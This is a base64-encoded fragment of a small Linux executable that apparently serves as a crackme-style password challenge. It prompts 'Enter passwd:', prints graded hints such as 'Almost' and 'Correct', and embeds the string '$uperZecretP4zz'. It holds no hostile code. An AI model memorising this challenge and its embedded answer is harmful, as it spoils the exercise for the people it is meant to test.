AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXF
LwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXKLwAA/yXMLwAADx9AAP8lyi8AAGgAAAAA6eD/////
JcIvAABoAQAAAOnQ/////yW6LwAAaAIAAADpwP////8lei8AAGaQAAAAAAAAAAAx7UmJ0V5IieJI
g+TwUFRFMcAxyUiNPc4AAAD/FS8vAAD0Zi4PH4QAAAAAAA8fQABIjT2BLwAASI0Fei8AAEg5+HQV
SIsFDi8AAEiFwHQJ/+APH4AAAAAAww8fgAAAAABIjT1RLwAASI01Si8AAEgp/kiJ8EjB7j9IwfgD
SAHGSNH+dBRIiwXdLgAASIXAdAj/4GYPH0QAAMMPH4AAAAAA8w8e+oA9DS8AAAB1K1VIgz26LgAA
AEiJ5XQMSIs97i4AAOgp////6GT////GBeUuAAABXcMPHwDDDx+AAAAAAPMPHvrpd////1VIieVI
gewgAQAASI0FmQ4AAEiJRejHRfwAAAAAx0X4AQAAAEiNBZAOAABIice4AAAAAOiv/v//SI2F4P7/
/0iJxkiNBYEOAABIice4AAAAAOih/v//SI2F4P7//0iJx+hy/v//SIP4Bg+FxQAAAA+2heD+//88
UHQZSI0FTA4AAEiJx7gAAAAA6Fn+///ptQAAAMdF9AEAAADrNotF9EiYD7aEBeD+//8PvsCD6DAB
RfyLRfRImA+2hAXg/v//D77AjVDQi0X4D6/CiUX4g0X0AYN99AV+xIN9/Bh1QIF9+AAIAAB1Nw+2
heH+//88OHUWSI0F2w0AAEiJx7gAAAAA6OH9///rQEiNBc0NAABIice4AAAAAOjL/f//6ypIjQXE
DQAASInHuAAAAADotf3//+sUSI0FtA0AAEiJx7gAAAAA6J/9//+4AAAAAMnDSIPsCEiDxAjDAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAIAJHVwZXJaZWNyZXRQ
NHp6AEVudGVyIHBhc3N3ZDogACVzAEFsbW9zdABDb3JyZWN0AHJlYWxseSBjbG9zZQBDbG9zZQBJ
bmNvcnJlY3QAAAABGwM7KAAAAAQAAADM7///dAAAAAzw//+cAAAAHPD//0QAAAAF8f//tAAAABQA
AAAAAAAAAXpSAAF4EAEbDAcIkAEHEBQAAAAcAAAA0O///yIAAAAAAAAAAAAAABQAAAAAAAAAAXpS
AAF4EAEbDAcIkAEAACQAAAAcAAAAUO///0AAAAAADhBGDhhKDwt3CIAAPxo7KjMkIgAAAAAUAAAA
RAAAAGjv//8IAAAAAAAAAAAAAAAcAAAAXAAAAEnw//9PAQAAAEEOEIYCQw0GA0oBDAcIAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFARAAAAAAAAEBEAAAAA
AAABAAAAAAAAAD8AAAAAAAAADAAAAAAAAAAAEAAAAAAAAA0AAAAAAAAAqBIAAAAAAAAZAAAAAAAA
ANA9AAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAA2D0AAAAAAAAcAAAAAAAAAAgAAAAAAAAA
9f7/bwAAAACgAwAAAAAAAAUAAAAAAAAAoAQAAAAAAAAGAAAAAAAAAMgDAAAAAAAACgAAAAAAAACv
AAAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAAAAAAAAAAAwAAAAAAAADoPwAAAAAAAAIA
AAAAAAAASAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAABoBgAAAAAAAAcAAAAAAAAAqAUA
AAAAAAAIAAAAAAAAAMAAAAAAAAAACQAAAAAAAAAYAAAAAAAAAPv//28AAAAAAAAACAAAAAD+//9v
AAAAAGgFAAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAUAUAAAAAAAD5//9vAAAAAAMAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAA4D0AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAABGEAAAAAAAAFYQAAAAAAAA
AAAAAAAAAAAgQAAAAAAAAEdDQzogKERlYmlhbiAxMi4yLjAtMSkgMTIuMi4wAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAACQAAAAEABAB8AwAAAAAAACAA
AAAAAAAAEwAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAHgAAAAIADwCgEAAAAAAAAAAAAAAAAAAAIAAA
AAIADwDQEAAAAAAAAAAAAAAAAAAAMwAAAAIADwAQEQAAAAAAAAAAAAAAAAAASQAAAAEAGgAoQAAA
AAAAAAEAAAAAAAAAVQAAAAEAFQDYPQAAAAAAAAAAAAAAAAAAfAAAAAIADwBQEQAAAAAAAAAAAAAA
AAAAiAAAAAEAFADQPQAAAAAAAAAAAAAAAAAApwAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAEwAAAAQA
8f8AAAAAAAAAAAAAAAAAAAAArgAAAAEAEwAoIQAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAA
AAAAAAAAAAAAvAAAAAEAFgDgPQAAAAAAAAAAAAAAAAAAxQAAAAAAEgBUIAAAAAAAAAAAAAAAAAAA
2AAAAAEAGADoPwAAAAAAAAAAAAAAAAAA7gAAABIAAAAAAAAAAAAAAAAAAAAAAAAACwEAACAAAAAA
AAAAAAAAAAAAAAAAAAAAXAEAACAAGQAYQAAAAAAAAAAAAAAAAAAAJwEAABAAGQAoQAAAAAAAAAAA
AAAAAAAALgEAABICEACoEgAAAAAAAAAAAAAAAAAANAEAABIAAAAAAAAAAAAAAAAAAAAAAAAARwEA
ABIAAAAAAAAAAAAAAAAAAAAAAAAAWgEAABAAGQAYQAAAAAAAAAAAAAAAAAAAZwEAACAAAAAAAAAA
AAAAAAAAAAAAAAAAdgEAABECGQAgQAAAAAAAAAAAAAAAAAAAgwEAABEAEQAAIAAAAAAAAAQAAAAA
AAAAkgEAABAAGgAwQAAAAAAAAAAAAAAAAAAAYAEAABIADwBwEAAAAAAAACIAAAAAAAAAlwEAABAA
GgAoQAAAAAAAAAAAAAAAAAAAowEAABIADwBZEQAAAAAAAE8BAAAAAAAAqAEAABIAAAAAAAAAAAAA
AAAAAAAAAAAAwQEAABECGQAoQAAAAAAAAAAAAAAAAAAAzQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA
5wEAACIAAAAAAAAAAAAAAAAAAAAAAAAAAgIAABICDAAAEAAAAAAAAAAAAAAAAAAAAFNjcnQxLm8A
X19hYmlfdGFnAGNydHN0dWZmLmMAZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRv
cnNfYXV4AGNvbXBsZXRlZC4wAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5
